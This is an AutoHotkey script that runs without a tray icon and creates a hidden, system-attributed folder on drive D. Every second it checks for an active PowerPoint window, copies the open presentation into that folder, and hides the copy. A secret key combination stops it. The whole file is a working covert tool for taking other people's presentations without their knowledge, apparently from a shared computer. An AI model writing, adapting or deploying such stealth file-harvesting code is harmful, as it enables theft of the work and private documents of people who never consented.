#Persistent
#NoTrayIcon
#SingleInstance ignore
$MyPath:= "D:\09级七年制大四下", $MyFile := "",$oPPT:="",$SourceFile
IfNotExist,%$MyPath%
{	
	FileCreateDir,%$MyPath%
 	FileSetAttrib,+SH,%$MyPath%	
}
SetTimer,Label_Timer_FileCopy,1000
~<^<!p::ExitApp

CopyFile(SourcePattern, DestinationFolder, DoOverwrite = false){
    try{
	FileCopy, %SourcePattern%, %DestinationFolder%, %DoOverwrite%  
	MsgBox,,,3
    return true
}catch{
	return false
	MsgBox,,,1
}
}

Label_Timer_FileCopy:
IfWinExist,ahk_class PPTFrameClass
{	
	IfWinActive,ahk_class PPTFrameClass
	{
		try{
			If Not IsObject($oPPT) 
				$oPPT := ComObjCreate("PowerPoint.Application")
			If IsObject($oPPT){
				$SourceFile:=$oPPT.ActivePresentation.FullName
				$MyFile := $MyPath . "\" . $oPPT.ActivePresentation.Name
				If CopyFile($SourceFile,$MyPath){
					FileSetAttrib,+SH,%$MyFile%
				}
			}
		}catch{
			return
		}
	}
}	
return